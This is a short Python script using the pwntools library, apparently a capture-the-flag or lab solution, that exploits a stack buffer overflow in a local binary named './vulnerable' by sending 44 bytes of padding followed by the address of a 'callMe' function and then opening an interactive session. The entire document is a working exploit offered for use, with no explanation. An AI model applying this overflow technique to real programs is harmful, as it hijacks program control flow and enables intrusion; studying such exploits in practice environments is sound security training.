from pwn import *

binary = "./vulnerable"
elf = ELF(binary)

p = process(binary)

junk = "A"*44

callMe = p32(elf.symbols['callMe'])

payload = junk + callMe

p.sendline(payload)
p.interactive()
